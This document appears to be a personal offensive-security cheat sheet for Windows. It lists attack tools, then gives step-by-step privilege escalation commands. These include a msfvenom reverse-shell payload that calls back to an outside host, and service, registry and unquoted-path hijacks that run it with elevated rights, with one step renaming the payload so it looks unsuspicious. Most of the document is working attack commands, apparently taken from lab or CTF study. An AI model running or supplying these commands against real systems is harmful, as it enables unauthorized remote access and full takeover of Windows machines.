# Windows

## Evil-WinRM

Ultimate shell

## MobaDiff

Compare multiple files/directories

## Detect it Easy

Tool to detect the type of a program

## Enum4Linux

Enumerates Windows stuff running on a machine

## Kerbrute

Brute forces active directory

## SMBMap

Detects and exploits Samba vulnerabilities

## Impacket

Series of scripts that gets you inside a Windows Machine

## PowerCat

NetCat for Powershell - 
https://github.com/besimorhino/powercat

## Shortcut Modification

https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md

## Powershell scripts without powershell - PowerlessShell

https://github.com/Mr-Un1k0d3r/PowerLessShell


## Windows Privilege Escalation

### Generate Reverse Shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
````

### Start Samba Server

```
sudo smbserver.py kali .
```

### Copy from Samba Server on Windows

```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

### Insecure Service Permissions

- Check user permissions for service:
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user SERVICENAME
```

- Query Service privileges:
```
sc qc SERVICENAME
```

- Set binary path to the reverse shell:
```
sc config SERVICENAME binpath= "\"C:\PrivEsc\reverse.exe\""
```

- Start Service:
```
net start SERVICENAME
```

### Unquoted Service Path

- Check Binary Path of Service:
```
sc qc SERVICENAME
```

- Check if user can write to directory:
```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

- Copy the reverse shell to the directory with the unsupicious name 
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

- Start the service:
```
net start SERVICENAME
```

### Weak Registry Permissions

- Check permissions of service:

```
sc qc SERVICENAME
```

- Check if user has write permissions:

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICENAME
```

- Overwrite the ImagePath registry key to point to the reverse shell:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICENAME /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

- Start Service:

```
net start SERVICENAME
```

### Insecure Service Executables

- Check service privileges:

```
sc qc SERVICENAME
```

- Check if user has write permissions:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\SERVICENAME.exe"
```

- Replace the service.exe with the reverse shell:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\SERVICENAME.exe" /Y
```


- Start the service:

```
net start SERVICENAME
```




## Various Techniques to send malware to Windows Machines

https://tryhackme.com/room/weaponization
